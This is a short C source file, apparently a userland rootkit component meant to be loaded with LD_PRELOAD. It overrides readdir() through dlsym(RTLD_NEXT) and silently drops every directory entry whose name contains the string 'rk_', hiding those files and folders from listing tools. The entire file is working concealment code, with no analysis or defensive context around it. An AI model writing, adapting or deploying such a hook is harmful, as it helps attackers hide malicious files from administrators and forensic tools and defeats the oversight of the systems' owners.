#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

// Keyword to hide files or directories
static const char *HIDE_KEY = "rk_";

// Intercept readdir() to hide entries
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;

    while ((entry = original_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, HIDE_KEY) == NULL) {
            return entry;
        }
    }
    return NULL;
}
